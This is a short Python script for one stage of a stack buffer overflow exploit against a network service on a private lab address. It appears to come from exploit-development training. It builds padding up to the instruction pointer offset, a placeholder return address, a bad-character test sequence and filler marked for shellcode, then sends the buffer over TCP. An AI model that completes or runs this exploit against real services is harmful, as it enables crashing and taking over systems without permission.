#!/usr/bin/env python3

import socket

# Target Information

RHOST = "192.168.226.225"   # IP of target Remote Host
RPORT = 31337   # Listening Port

buf_total = 1024    # Size of payload
offset_rp = 146 # No.of bytes before EIP

bad_chars = bytes(i for i in range(0x00,0xFF) if i not in [0x00,0x0A]) # check for bad characters
# print(bad_chars)

#write payload sent to file for comparing ESP with sent payload
with open("bad_chars.bin", "wb") as fd:
   fd.write(bad_chars)

# Build Response

buf = b""
buf += b"A"*(offset_rp-len(buf))    # initialpadding
buf += b"CCCC" # EIP should point to JMP ESP code in .dll 
buf +=  bad_chars   # Write to ESP and check for bad hex characters
buf += b"B"*(buf_total-len(buf)) # place for Shellcode 

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create IPV4 socket, TCP type
    s.connect((RHOST,RPORT)) # connect to remote host on   port
    s.send(buf + b"\n") 
    s.recv(1024)

except:
    print(f"[x] Failed!!")
    exit